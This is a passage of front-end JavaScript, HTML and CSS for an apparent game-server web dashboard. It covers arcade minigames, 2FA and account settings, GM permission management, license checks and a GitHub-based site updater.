            <button class="btn-glow" onclick="playDice('high')" style="background:#9b59b6!important; flex:1;">HIGH (4-6)</button>
        </div>
        <div id="diceResult" style="margin-top:20px; font-weight:bold; font-size:1.2rem;"></div>
    `;
}

async function renderLotteryUI() {
    const data = await arcadeFetch('get_settings', { game: 'lottery' });
    if (data.status === 'success') {
        const settings = data.data.settings || {};
        const ticketPrice = settings.ticket_price || 100;
        const currentPool = data.data.current_pool || 0;
        const myTickets = data.data.my_tickets || 0;
         document.getElementById('activeGameArea').innerHTML = `
            <h3><i class="fas fa-ticket-alt"></i> Daily Lottery</h3>
            <p style="color:#aaa;">Buy tickets to enter the prize pool!</p>
            <div class="lottery-pool-display" style="font-size: clamp(1.5rem, 8vw, 3rem);">${currentPool * ticketPrice} ${tp_short}</div>
            <p>Your Tickets: <strong class="text-info">${myTickets}</strong></p>
            <div style="margin:20px 0; display: flex; flex-wrap: wrap; justify-content: center; gap: 10px;">
                <input type="number" id="ticketCount" value="1" min="1" onchange="updateBuyButton(this.value, ${ticketPrice})" style="width:80px; text-align:center;">
                <button id="lotteryBuyBtn" class="btn-glow" onclick="buyTickets(document.getElementById('ticketCount').value, ${ticketPrice})" style="background:#f1c40f!important; color:#000!important; flex: 1; min-width: 150px;">BUY TICKETS (-${ticketPrice} ${tp_short})</button>
            </div>
            <div id="lotteryResult"></div>
        `;

    } else {
        document.getElementById('activeGameArea').innerHTML = `<div class="text-danger">Failed to load lottery: ${data.message}</div>`;
    }
}

function updateBuyButton(count, price) {
    const btn = document.getElementById('lotteryBuyBtn');
    if(btn) btn.innerText = `BUY TICKETS (-${count * price} ${tp_short})`;
}

async function loadWheelSettings() {
    console.log('[Arcade] Loading wheel settings...');
    const data = await arcadeFetch('get_settings', { game: 'spin_wheel' });
    if (data.status === 'success') {
        wheelSettings = data.data.settings;
        const costEl = document.getElementById('spinCost');
        if(costEl) costEl.innerText = data.data.cost;
        drawWheel();
    } else {
        console.error('[Arcade] Settings load error:', data.message);
        const res = document.getElementById('spinResult');
        if(res) res.innerHTML = `<span class="text-danger">Error: ${data.message}</span>`;
    }
}

function drawWheel() {
    const cv = document.getElementById('wheelCanvas');
    if (!cv || !wheelSettings.length) {
        console.warn('[Arcade] Cannot draw wheel: Canvas or settings missing', {cv, settings: wheelSettings.length});
        return;
    }
    const c = cv.getContext('2d');
    const slices = wheelSettings.length;
    const arc = (2 * Math.PI) / slices;
    
    c.clearRect(0, 0, cv.width, cv.height);
    const centerX = cv.width / 2;
    const centerY = cv.height / 2;
    const radius = (cv.width / 2) - 5;

    wheelSettings.forEach((s, i) => {
        const angle = i * arc;
        c.beginPath();
        c.fillStyle = s.color;
        c.moveTo(centerX, centerY);
        c.arc(centerX, centerY, radius, angle, angle + arc);
        c.lineTo(centerX, centerY);
        c.fill();
        c.strokeStyle = 'rgba(255,255,255,0.2)';
        c.stroke();
        
        c.save();
        c.translate(centerX, centerY);
        c.rotate(angle + arc / 2);
        c.textAlign = "right";
        c.fillStyle = "#fff";
        c.font = "bold 12px Arial";
        c.fillText(s.label, radius - 20, 5);
        c.restore();
    });
}

async function spinWheel() {
    if (isSpinning) return;
    const res = document.getElementById('spinResult');
    const cv = document.getElementById('wheelCanvas');
    res.innerHTML = '<span class="text-info">Spinning... <i class="fas fa-spinner fa-spin"></i></span>';
    
    const data = await arcadeFetch('spin', { game: 'spin_wheel' });
    if (data.status === 'error') {
        res.innerHTML = `<span class="text-danger">${data.message}</span>`;
        return;
    }
    
    isSpinning = true;
    const prizeIndex = data.prizeIndex;
    const slices = wheelSettings.length;
    
    // Immediate Deduction Feel: Update balance to (newBalance - won) to show cost taken
    syncBalance(data.newBalance - data.won);
    
    // Cumulative Math logic: 
    // 1. Pointer is at 12 o'clock (270 degrees)
    // 2. Slices start at 3 o'clock (0 degrees)
    const sliceAngle = 360 / slices;
    const targetOffset = 270 - (prizeIndex * sliceAngle + (sliceAngle / 2));
    
    // Increment rotation forward
    currentRotation += (5 * 360); // 5 full spins
    currentRotation += (targetOffset - (currentRotation % 360) + 360) % 360;
    
    cv.style.transform = `rotate(${currentRotation}deg)`;
    
    setTimeout(() => {
        isSpinning = false;
        res.innerHTML = `<span class="gradient-text" style="font-size:1.5rem;">🎉 WINNER: ${data.label}!</span>`;
        // Final update: Add winnings back to the UI
        syncBalance(data.newBalance);
        loadWinners();
    }, 4000);
}

async function playDice(choice) {
    const bet = document.getElementById('diceBet').value;
    const res = document.getElementById('diceResult');
    const diceObj = document.getElementById('diceObj');
    
    res.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Rolling...';
    diceObj.classList.add('fa-spin');

    const data = await arcadeFetch('dice_roll', { bet: bet, choice: choice });
    diceObj.classList.remove('fa-spin');
    
    if (data.status === 'error') {
        res.innerHTML = `<span class="text-danger">${data.message}</span>`;
        return;
    }
    
    // Deduct cost first for 'live' feel
    syncBalance(data.newBalance - data.won);
    
    const diceIcons = ['', 'one', 'two', 'three', 'four', 'five', 'six'];
    diceObj.innerHTML = `<i class="fas fa-dice-${diceIcons[data.dice]}"></i>`;
    
    if (data.isWin) {
        res.innerHTML = `<span class="text-success" style="font-size:1.5rem;">JACKPOT! You won ${data.won} ${tp_short}!</span>`;
    } else {
        res.innerHTML = `<span class="text-danger">Too bad! Better luck next time.</span>`;
    }
    
    // Update to final balance after a short pause
    setTimeout(() => {
        syncBalance(data.newBalance);
        loadWinners('dice_roll');
    }, 500);
}

async function buyTickets(price) {
    const count = document.getElementById('ticketCount').value;
    const data = await arcadeFetch('buy_lottery', { count: count });
    const res = document.getElementById('lotteryResult');
    
    if (data.status === 'success') {
        res.innerHTML = `<div class="text-success">${data.message}</div>`;
        syncBalance(data.newBalance);
        renderLotteryUI();
    } else {
        res.innerHTML = `<div class="text-danger">${data.message}</div>`;
    }
}

async function loadWinners(g = activeGame === 'wheel' ? 'spin_wheel' : (activeGame === 'dice' ? 'dice_roll' : 'lottery')) {
    const list = document.getElementById('winnersList');
    const data = await arcadeFetch('get_winners', { game: g });
    
    if (data.status === 'success') {
        list.innerHTML = data.winners.length ? data.winners.map(w => `
            <div style="padding:10px; border-bottom:1px solid rgba(255,255,255,0.05); display:flex; justify-content:space-between; align-items:center;">
                <div><strong style="color:#2ca4bf;">${w.username}</strong><br><small style="color:#888;">${w.prize_name}</small></div>
                <span class="badge-points text-success">+${w.won}</span>
            </div>
        `).join('') : '<div class="text-muted text-center">No winners yet.</div>';
    } else {
        list.innerHTML = `<div class="text-danger text-center">Failed to load winners.</div>`;
    }
}

// Refresh settings if tab switched to minigames
const originalOpenTab = openTab;
window.openTab = function(evt, tabName) {
    originalOpenTab(evt, tabName);
    if (tabName === 'MiniGames') { showLobby(); }
};

// 2FA Management Logic
async function handle2FA(action) {
    const statusArea = document.getElementById('2fa-status-area');
    const setupArea = document.getElementById('2fa-setup-area');
    const recoveryArea = document.getElementById('2fa-recovery-area');

    if (action === 'setup') {
        const res = await fetch('Actions/user-2fa.php?method=setup');
        const data = await res.json();
        if (data.status === 'success') {
            document.getElementById('2fa-qr-img').src = data.qrCodeUrl;
            document.getElementById('2fa-secret-text').innerText = data.secret;
            setupArea.style.display = 'block';
            statusArea.style.display = 'none';
        } else {
            alert(data.message);
        }
    } else if (action === 'confirm') {
        const code = document.getElementById('verify2faCode').value;
        const res = await fetch('Actions/user-2fa.php?method=confirm', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: 'code=' + code
        });
        const data = await res.json();
        if (data.status === 'success') {
            setupArea.style.display = 'none';
            recoveryArea.style.display = 'block';
            const list = document.getElementById('recovery-codes-list');
            list.innerHTML = data.recoveryCodes.map(c => `<div>${c}</div>`).join('');
        } else {
            alert(data.message);
        }
    } else if (action === 'disable') {
        const code = document.getElementById('disable2faCode').value;
        if (!code) return alert('Please enter the 2FA code.');
        const res = await fetch('Actions/user-2fa.php?method=disable', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: 'code=' + code
        });
        const data = await res.json();
        if (data.status === 'success') {
            location.reload();
        } else {
            alert(data.message);
        }
    }
}

// Player Settings Logic
async function handlePlayerSettings(action) {
    const params = new URLSearchParams();
    if (action === 'change_password') {
        params.append('old_pass', document.getElementById('pass_old') ? document.getElementById('pass_old').value : '');
        params.append('new_pass', document.getElementById('pass_new').value);
        params.append('confirm_pass', document.getElementById('pass_confirm').value);
    } else if (action === 'change_email') {
        params.append('old_pass', document.getElementById('email_old_pass') ? document.getElementById('email_old_pass').value : '');
        params.append('new_email', document.getElementById('email_new').value);
    }

    const res = await fetch(`Actions/player-settings.php?method=${action}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: params
    });
    const data = await res.json();
    alert(data.message);
    if (data.status === 'success') location.reload();
}

// GM Management Logic
function showGMManagement() {
    document.getElementById('adminDefaultView').style.display = 'none';
    document.getElementById('adminFrame').style.display = 'none';
    document.getElementById('gmManagementTool').style.display = 'block';
}

async function handleGMManagement(action) {
    if (action === 'search') {
        const username = document.getElementById('gmSearchUser').value;
        if (!username) return alert('Enter a username.');
        
        const params = new URLSearchParams();
        params.append('username', username);
        
        const res = await fetch('Actions/manage-gm.php?method=search_user', {
            method: 'POST',
            body: params
        });
        const data = await res.json();
        
        if (data.status === 'success') {
            document.getElementById('gmUserResult').style.display = 'block';
            document.getElementById('resUserName').innerText = data.user.name;
            document.getElementById('resUserEmail').innerText = data.user.mail;
            document.getElementById('resUserPv').innerText = 'PV: ' + data.user.pv;
            document.getElementById('newPvLevel').value = data.user.pv;
        } else {
            alert(data.message);
            document.getElementById('gmUserResult').style.display = 'none';
        }
    } else if (action === 'update') {
        const username = document.getElementById('resUserName').innerText;
        const pv = document.getElementById('newPvLevel').value;
        const code = document.getElementById('admin2faCode').value;
        
        if (!code) return alert('Please enter your 2FA code to verify.');
        
        const params = new URLSearchParams();
        params.append('account', username);
        params.append('pv', pv);
        params.append('code', code);
        
        const res = await fetch('Actions/manage-gm.php?method=update_pv', {
            method: 'POST',
            body: params
        });
        const data = await res.json();
        alert(data.message);
        if (data.status === 'success') handleGMManagement('search');
    }
}

// License & Whitelist Logic
function showLicenseRecheck() {
    document.getElementById('adminDefaultView').style.display = 'none';
    document.getElementById('adminFrame').style.display = 'none';
    document.getElementById('gmManagementTool').style.display = 'none';
    document.getElementById('systemUpdatesTool').style.display = 'none';
    document.getElementById('licenseRecheckTool').style.display = 'block';
    forceRecheckLicense(false);
}

async function forceRecheckLicense(isManual = false) {
    const btn = document.getElementById('recheckLicenseBtn');
    const originalHtml = btn ? btn.innerHTML : '';
    if (btn && isManual) {
        btn.disabled = true;
        btn.innerHTML = '<i class="fas fa-sync-alt fa-spin"></i> Verifying...';
    }

    try {
        const res = await fetch('Actions/recheck-license.php');
        const data = await res.json();

        if (btn && isManual) {
            btn.disabled = false;
            btn.innerHTML = originalHtml;
        }

        if (data.status === 'success') {
            if (isManual) alert('Success: ' + data.message);
            
            const listDiv = document.getElementById('whitelistedDomainsList');
            if (listDiv) {
                const isAuth = data.authorized;
                const statusBadge = isAuth 
                    ? '<span style="background:rgba(46,204,113,0.15); color:#2ecc71; padding:6px 14px; border-radius:20px; font-weight:bold; font-size:0.85rem; border:1px solid rgba(46,204,113,0.3);"><i class="fas fa-check-circle"></i> LICENSED & ACTIVE</span>'
                    : '<span style="background:rgba(239,68,68,0.15); color:#ef4444; padding:6px 14px; border-radius:20px; font-weight:bold; font-size:0.85rem; border:1px solid rgba(239,68,68,0.3);"><i class="fas fa-times-circle"></i> NOT AUTHORIZED</span>';

                let html = `
                    <div style="display:flex; flex-direction:column; gap:15px;">
                        <div style="display:flex; justify-content:space-between; align-items:center; background:rgba(255,255,255,0.03); padding:15px 20px; border-radius:10px; border:1px solid rgba(255,255,255,0.06); flex-wrap:wrap; gap:10px;">
                            <div style="display:flex; align-items:center; gap:12px;">
                                <i class="fas fa-globe fa-lg" style="color:#2ca4bf;"></i>
                                <div>
                                    <div style="font-size:0.75rem; color:rgba(255,255,255,0.5); text-transform:uppercase; letter-spacing:1px;">Active Domain / Host</div>
                                    <strong style="color:#fff; font-size:1.05rem; font-family:monospace;">${data.current_domain}</strong>
                                </div>
                            </div>
                            ${statusBadge}
                        </div>

                        <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap:12px;">
                            <div style="background:rgba(255,255,255,0.03); padding:15px; border-radius:10px; border:1px solid rgba(255,255,255,0.06);">
                                <div style="font-size:0.75rem; color:rgba(255,255,255,0.5); text-transform:uppercase; letter-spacing:1px; margin-bottom:5px;">Expiration Date</div>
                                <div style="color:#2ecc71; font-weight:bold; font-size:0.95rem;">${data.expiry}</div>
                            </div>

                            <div style="background:rgba(255,255,255,0.03); padding:15px; border-radius:10px; border:1px solid rgba(255,255,255,0.06);">
                                <div style="font-size:0.75rem; color:rgba(255,255,255,0.5); text-transform:uppercase; letter-spacing:1px; margin-bottom:5px;">Last Verified</div>
                                <div style="color:rgba(255,255,255,0.8); font-size:0.9rem;">${data.updated_at}</div>
                            </div>
                        </div>
                    </div>
                `;
                listDiv.innerHTML = html;
            }
        } else {
            if (isManual) alert('Error: ' + data.message);
        }
    } catch (e) {
        if (btn && isManual) {
            btn.disabled = false;
            btn.innerHTML = originalHtml;
        }
        if (isManual) alert('Failed to connect to license recheck server.');
    }
}

// Website Updates Logic
function resetUpdateStatusUI() {
    const loading = document.getElementById('updateLoading');
    const ready   = document.getElementById('updateReady');
    const found   = document.getElementById('updateFound');
    const error   = document.getElementById('updateError');

    if (loading) loading.style.display = 'block';
    if (ready)   ready.style.display   = 'none';
    if (found)   found.style.display   = 'none';
    if (error)   error.style.display   = 'none';
}

function showSystemUpdates() {
    document.getElementById('adminDefaultView').style.display = 'none';
    document.getElementById('adminFrame').style.display = 'none';
    document.getElementById('gmManagementTool').style.display = 'none';
    document.getElementById('licenseRecheckTool').style.display = 'none';
    document.getElementById('systemUpdatesTool').style.display = 'block';
    
    resetUpdateStatusUI();
    checkSystemUpdates(true);
}

async function checkSystemUpdates(isManual = false) {
    resetUpdateStatusUI();
    try {
        const res = await fetch('Actions/system-update.php?method=check');
        if (!res.ok) throw new Error('HTTP ' + res.status);
        const data = await res.json();

        const loading = document.getElementById('updateLoading');
        const ready   = document.getElementById('updateReady');
        const found   = document.getElementById('updateFound');
        const error   = document.getElementById('updateError');

        if (data.status === 'error') {
            throw new Error(data.message || 'Could not reach update server.');
        }

        if (data.status === 'update_available') {
            const badge  = document.getElementById('updateVersionBadge');
            const notice = document.getElementById('systemUpdateNotice');
            if (badge)  badge.innerText = 'v' + data.latest_version;
            if (notice) notice.style.display = 'block';

            const latestText = document.getElementById('latestVerText');
            if (latestText) {
                latestText.innerText = 'v' + data.latest_version;
                latestText.style.color = '#2ecc71';
            }
            if (loading) loading.style.display = 'none';
            if (found)   found.style.display   = 'block';
            if (ready)   ready.style.display   = 'none';
            if (error)   error.style.display   = 'none';
            const nvf = document.getElementById('newVerFoundText');
            if (nvf) nvf.innerText = 'New Version Found: v' + data.latest_version;
        } else {
            const latestText = document.getElementById('latestVerText');
            if (latestText) {
                latestText.innerText = 'v' + (data.latest_version || data.current_version || '?');
                latestText.style.color = '#2ca4bf';
            }
            if (loading) loading.style.display = 'none';
            if (ready)   ready.style.display   = 'block';
            if (found)   found.style.display   = 'none';
            if (error)   error.style.display   = 'none';
            const msg = document.getElementById('updateMessage');
            if (msg) msg.innerText = 'Your website is up to date (v' + (data.current_version || '?') + ').';
        }
    } catch (e) {
        console.error('[Updater] Check failed:', e);
        const loading  = document.getElementById('updateLoading');
        const ready    = document.getElementById('updateReady');
        const found    = document.getElementById('updateFound');
        const error    = document.getElementById('updateError');
        const errorMsg = document.getElementById('updateErrorMsg');
        if (loading)  loading.style.display = 'none';
        if (ready)    ready.style.display   = 'none';
        if (found)    found.style.display   = 'none';
        if (error)    error.style.display   = 'block';
        if (errorMsg) errorMsg.innerText = e.message || 'Check failed';
    }
}

let isUpdating = false;

window.addEventListener('beforeunload', function (e) {
    if (isUpdating) {
        e.preventDefault();
        e.returnValue = 'System update is currently in progress. Refreshing may interrupt file downloads!';
        return e.returnValue;
    }
});

async function doSystemUpdate() {
    if (isUpdating) return;
    if (!confirm('Are you sure you want to run the system update?\nThis will synchronize files with the latest version from GitHub.')) return;

    isUpdating = true;
    
    // Update button states
    const topBtn = document.getElementById('topUpdateBtn');
    const mainBtn = document.getElementById('mainUpdateBtn');
    if (topBtn) { topBtn.disabled = true; topBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> UPDATING...'; }
    if (mainBtn) { mainBtn.disabled = true; mainBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> UPDATING...'; }

    // Show Progress Modal
    const modal = document.getElementById('updateProgressModal');
    const bar = document.getElementById('updateProgressBar');
    const msg = document.getElementById('updateProgressText');
    
    if (modal) modal.style.display = 'flex';
    if (bar) bar.style.width = '20%';
    if (msg) msg.innerHTML = '<i class="fas fa-download fa-spin"></i> Downloading core system files from GitHub...';

    // Step animation timer for real-time visual progress
    let currentPercent = 20;
    let stepTimer = setInterval(() => {
        if (!isUpdating) { clearInterval(stepTimer); return; }
        if (currentPercent < 85) {
            currentPercent += 15;
            if (bar) bar.style.width = currentPercent + '%';
            if (currentPercent >= 40 && currentPercent < 60) {
                if (msg) msg.innerHTML = '<i class="fas fa-sync fa-spin"></i> Verifying checksums & applying code changes...';
            } else if (currentPercent >= 60) {
                if (msg) msg.innerHTML = '<i class="fas fa-shield-alt fa-spin"></i> Updating version manifest & finalizing system state...';
            }
        }
    }, 600);

    try {
        const res = await fetch('Actions/system-update.php?method=update');
        const data = await res.json();
        clearInterval(stepTimer);

        if (data.status === 'success') {
            if (bar) bar.style.width = '100%';
            let successMsg = '<span style="color:#2ecc71; font-weight:bold;"><i class="fas fa-check-circle"></i> ' + (data.message || 'System Updated!') + ' Reloading...</span>';
            if (data.warnings && data.warnings.length > 0) {
                successMsg += '<br><small style="color:#fcc419; opacity:0.8;"><i class="fas fa-exclamation-triangle"></i> Minor warnings: ' + data.warnings.join(', ') + '</small>';
            }
            if (msg) msg.innerHTML = successMsg;
            setTimeout(() => {
                isUpdating = false;
                location.reload();
            }, 2000);
        } else {
            // Build a clear error report
            let errDetail = data.message || 'Update failed';
            if (data.errors && data.errors.length > 0) {
                errDetail += '\n\nFailed files:\n• ' + data.errors.slice(0, 10).join('\n• ');
                if (data.errors.length > 10) errDetail += '\n• ... and ' + (data.errors.length - 10) + ' more.';
            }
            throw new Error(errDetail);
        }
    } catch (e) {
        clearInterval(stepTimer);
        isUpdating = false;
        if (modal) modal.style.display = 'none';
        if (topBtn) { topBtn.disabled = false; topBtn.innerHTML = '<i class="fas fa-sync-alt"></i> UPDATE NOW'; }
        if (mainBtn) { mainBtn.disabled = false; mainBtn.innerHTML = '<i class="fas fa-download"></i> UPDATE NOW'; }

        const loading  = document.getElementById('updateLoading');
        const ready    = document.getElementById('updateReady');
        const found    = document.getElementById('updateFound');
        const error    = document.getElementById('updateError');
        const errorMsg = document.getElementById('updateErrorMsg');

        if (loading)  loading.style.display = 'none';
        if (ready)    ready.style.display   = 'none';
        if (found)    found.style.display   = 'none';
        if (error)    error.style.display   = 'block';
        if (errorMsg) errorMsg.innerText = e.message;
    }
}

async function verifySystemIntegrity(btnId = 'verifyIntegrityBtnReady') {
    const btn = document.getElementById(btnId);
    const list = document.getElementById('integrityFileList');
    const container = document.getElementById('integrityResults');
    
    if (btn) {
        btn.disabled = true;
        btn.originalHtml = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';
    }
    
    list.innerHTML = '<div style="text-align:center; padding:20px; opacity:0.5;">Comparing local files with GitHub master hashes...</div>';
    container.style.display = 'block';

    try {
        const res = await fetch('Actions/system-update.php?method=verify');
        const data = await res.json();

        if (data.status === 'success') {
            if (btn) btn.innerHTML = '<i class="fas fa-check-double"></i> Complete';
            list.innerHTML = data.details.map(f => {
                let statusIcon = '<i class="fas fa-check-circle text-success"></i>';
                let statusText = '<span style="color:#2ecc71">Matched</span>';
                
                if (f.status === 'outdated') {
                    statusIcon = '<i class="fas fa-exclamation-triangle" style="color:#f1c40f;"></i>';
                    statusText = '<span style="color:#f1c40f">Old Version</span>';
                } else if (f.status === 'missing') {
                    statusIcon = '<i class="fas fa-times-circle text-danger"></i>';
                    statusText = '<span style="color:#e74c3c">Missing</span>';
                }

                return '<div style="display:flex; justify-content:space-between; align-items:center; padding:8px 0; border-bottom:1px solid rgba(255,255,255,0.05); font-size:0.85rem;">' +
                        '<div style="display:flex; align-items:center; gap:10px;">' +
                            '<div style="width:20px; text-align:center;">' + statusIcon + '</div>' +
                            '<span style="opacity:0.8;">' + f.file + '</span>' +
                        '</div>' +
                        '<div style="font-family:monospace; font-size:0.75rem;">' + statusText + '</div>' +
                    '</div>';
            }).join('');
        } else {
            throw new Error(data.message);
        }
    } catch (e) {
        if (btn) {
            btn.disabled = false;
            btn.innerHTML = '<i class="fas fa-shield-alt"></i> Retry';
        }
        list.innerHTML = '<div class="text-danger" style="padding:20px; text-align:center;">Error: ' + e.message + '</div>';
    }
}
</script>

<!-- Update Progress Modal -->
<div id="updateProgressModal" style="display:none; position:fixed; inset:0; background:rgba(10,10,18,0.95); z-index:99999; backdrop-filter:blur(15px); align-items:center; justify-content:center;">
    <div class="glass-card" style="width:450px; padding:50px; text-align:center; border:1px solid rgba(44, 164, 191, 0.4); box-shadow:0 0 100px rgba(44, 164, 191, 0.2);">
        <div style="margin-bottom:30px;"><i class="fas fa-sync-alt fa-spin fa-4x" style="color:#2ca4bf;"></i></div>
        <h2 style="color:#fff; margin-bottom:10px;">Updating Talisman</h2>
        <p id="updateProgressText" style="color:rgba(255,255,255,0.7); line-height:1.6;">Applying latest security patches and features...</p>
        <div style="height:4px; background:rgba(255,255,255,0.1); border-radius:10px; margin-top:30px; overflow:hidden;">
            <div id="updateProgressBar" style="width:0%; height:100%; background:linear-gradient(90deg, #2ca4bf, #00d2ff); transition:width 0.3s;"></div>
        </div>
    </div>
</div>

<!-- Receipt Lightbox -->
<div id="receiptModal" class="dashboard-modal" style="display:none;" onclick="if(event.target==this)this.style.display='none'">
    <div class="receipt-viewer-content">
        <span class="close-btn" onclick="document.getElementById('receiptModal').style.display='none'">&times;</span>
        <img id="receiptImg" style="max-width:100%; max-height:85vh; border-radius:12px; border:2px solid #2ca4bf;">
    </div>
</div>

<!-- Appeal Modal -->
<div id="appealModal" class="dashboard-modal" style="display:none;" onclick="if(event.target==this)this.style.display='none'">
    <div class="glass-card appeal-chat-card">
        <span class="close-btn" onclick="document.getElementById('appealModal').style.display='none'">&times;</span>
        <div class="appeal-header">
            <h3><i class="fas fa-comment-medical"></i> Donation Appeal</h3>
            <p>Support for Transaction ID: <strong id="appealTxId" class="text-info"></strong></p>
        </div>
        <div id="appealMessages" class="appeal-messages scrollable"></div>
        <div class="appeal-footer">
            <div class="modern-form">
                <div class="form-group" style="margin-bottom:0px;">
                    <textarea id="appealInput" placeholder="Message to Admin..." style="width:100%; background:rgba(0,0,0,0.3); border:1px solid rgba(255,255,255,0.1); border-radius:8px; color:#fff; padding:10px; height:60px;"></textarea>
                </div>
                <button type="button" class="btn-glow" onclick="sendAppealMessage()" style="width:100%; margin-top:10px;">Send Message</button>
            </div>
        </div>
    </div>
</div>

<style>
.glass-panel {
    background: rgba(255, 255, 255, 0.03) !important;
    border: 1px solid rgba(255, 255, 255, 0.05) !important;
    border-radius: 15px;
    backdrop-filter: blur(10px);
}

.scrollable {
    overflow-y: auto;
}

.scrollable::-webkit-scrollbar {
    width: 6px;
}

.scrollable::-webkit-scrollbar-track {
    background: rgba(0, 0, 0, 0.1);
}

.scrollable::-webkit-scrollbar-thumb {
    background: rgba(255, 255, 255, 0.1);
    border-radius: 3px;
}

.mobile-header { display: none; }
.hamburger-btn { background: transparent; border: none; color: #2ca4bf; font-size: 1.5rem; cursor: pointer; transition: 0.2s; }
.hamburger-btn:hover { color: #fff; transform: scale(1.1); }

.sidebar-overlay {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.6);
    backdrop-filter: blur(4px);
    z-index: 999;
}

/* Accordion Styles */
.accordion-header {
    background: rgba(44, 164, 191, 0.05);
    border: 1px solid rgba(44, 164, 191, 0.1);
    padding: 12px 15px;
    border-radius: 8px;
    margin-bottom: 5px;
    cursor: pointer;
    display: flex;
    justify-content: space-between;
    align-items: center;
    transition: 0.3s;
}
.accordion-header:hover {
    background: rgba(44, 164, 191, 0.15);
    border-color: rgba(44, 164, 191, 0.3);
}
.accordion-header.active {
    background: rgba(44, 164, 191, 0.2);
    border-color: #2ca4bf;
    color: #fff;
}
.accordion-header .caret {
    transition: transform 0.3s;
}
.accordion-header.active .caret {
    transform: rotate(180deg);
}
.accordion-content {
    max-height: 0;
    overflow: hidden;
    transition: max-height 0.4s ease-out, padding 0.3s ease;
    background: rgba(0,0,0,0.2);
    border-radius: 0 0 8px 8px;
    margin-bottom: 10px;
    padding: 0 15px;
}
.legacy-nav-column {
    background: rgba(0, 0, 0, 0.2);
    border-radius: 15px;
    padding: 20px;
    width: 100%;
    max-width: 280px;
    overflow-y: auto;
}
.accordion-content.expanded {
    max-height: 2000px; /* Increased for safer expansion */
    padding: 15px;
    border: 1px solid rgba(44, 164, 191, 0.1);
    border-top: none;
    opacity: 1;
    visibility: visible;
}

.admin-triple-grid {
    display: grid;
    grid-template-columns: 280px 1fr 300px;
    gap: 20px;
    height: calc(100vh - 350px);
    min-height: 600px;
    align-items: stretch;
    overflow: visible;
    position: relative;
    padding: 10px 0;
}

@media (max-width: 1366px) {
    .admin-triple-grid {
        grid-template-columns: 250px 1fr 260px;
        gap: 15px;
    }
}

@media (max-width: 1100px) {
    .admin-triple-grid {
        grid-template-columns: 250px 1fr;
        height: auto;
    }
    .legacy-vis-column {
        grid-column: 1 / -1;
    }
}

@media (max-width: 768px) {
    .admin-triple-grid {
        grid-template-columns: 1fr;
        height: auto;
    }
    .legacy-nav-column,
    .legacy-frame-container,
    .legacy-vis-column {
        width: 100%;
        max-width: 100%;
    }
}

/* Visibility Settings Styles */
.visibility-settings-card {
    margin-top: 20px;
    border: 1px solid rgba(252, 196, 25, 0.2);
    background: linear-gradient(135deg, rgba(252, 196, 25, 0.05) 0%, rgba(0, 0, 0, 0.4) 100%);
    padding: 25px;
    border-radius: 16px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.3);
}

.settings-title {
    margin-top: 0;
    color: #fcc419;
    font-size: 1rem;
    text-transform: uppercase;
    letter-spacing: 2px;
    font-weight: 800;
    margin-bottom: 10px;
    display: flex;
    align-items: center;
    gap: 10px;
}

.settings-desc {
    font-size: 0.85rem;
    color: rgba(255,255,255,0.5);
    margin-bottom: 25px;
    line-height: 1.4;
}

.visibility-grid {
    display: grid;
    grid-template-columns: 1fr;
    gap: 12px;
    margin-bottom: 25px;
}

.visibility-grid .check-item {
    position: relative !important;
    display: flex !important;
    transform: none !important;
}

.visibility-grid .check-item .label-text {
    position: relative !important;
    top: auto !important;
    left: auto !important;
    background: transparent !important;
    padding: 0 !important;
    font-size: 0.9rem !important;
    color: #fff !important;
    border: none !important;
    margin: 0 !important;
}

.check-item {
    display: flex;
    align-items: center;
    gap: 15px;
    cursor: pointer;
    padding: 12px 18px;
    background: rgba(255,255,255,0.03);
    border: 1px solid rgba(255,255,255,0.05);
    border-radius: 10px;
    transition: all 0.3s ease;
    position: relative;
    overflow: hidden;
}

.check-item:hover {
    background: rgba(255,255,255,0.08);
    border-color: rgba(252, 196, 25, 0.3);
    transform: translateX(5px);
}

.check-item input[type="checkbox"] {
    position: absolute;
    opacity: 0;
    cursor: pointer;
    height: 0;
    width: 0;
}

.checkmark {
    height: 20px;
    width: 20px;
    background-color: rgba(0,0,0,0.3);
    border: 2px solid rgba(255,255,255,0.2);
    border-radius: 6px;
    position: relative;
    transition: 0.3s;
}

.check-item:hover .checkmark {
    border-color: #fcc419;
}

.check-item input:checked ~ .checkmark {
    background-color: #fcc419;
    border-color: #fcc419;
    box-shadow: 0 0 10px rgba(252, 196, 25, 0.4);
}

.checkmark:after {
    content: "";
    position: absolute;
    display: none;
    left: 6px;
    top: 2px;
    width: 5px;
    height: 10px;
    border: solid black;
    border-width: 0 2px 2px 0;
    transform: rotate(45deg);
}

.check-item input:checked ~ .checkmark:after {
    display: block;
}

.label-text {
    color: rgba(255,255,255,0.8);
    font-size: 0.95rem;
    font-weight: 500;
}

.check-item input:checked ~ .label-text {
    color: #fff;
    font-weight: 700;
}

.full-btn {
    width: 100%;
    padding: 16px;
    border-radius: 12px;
    font-size: 0.9rem;
    font-weight: 700;
    background: linear-gradient(135deg, #fcc419 0%, #ff922b 100%);
    color: #000;
}

@media (max-width: 768px) {
    .dashboard-modal { padding: 0; }
    .dashboard-wrapper { width: 100%; height: 100%; border-radius: 0; max-height: none; }
    .dashboard-layout { flex-direction: column; overflow-y: auto; height: calc(100% - 60px); position: relative; }
    
    .dashboard-sidebar {
        position: fixed;
        left: -100%;
        top: 60px;
        height: calc(100% - 60px);
        z-index: 1000;
        transition: left 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        width: 280px;
        max-width: 85%;
        background: #0f0f1a;
        box-shadow: 10px 0 30px rgba(0,0,0,0.5);
        border-radius: 0 20px 20px 0;
    }
    .dashboard-sidebar.mobile-open { left: 0; }
    .dashboard-sidebar.mobile-open + #sidebarOverlay { display: block; }
    
    .mobile-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 0 20px;
        background: rgba(15, 15, 18, 0.95);
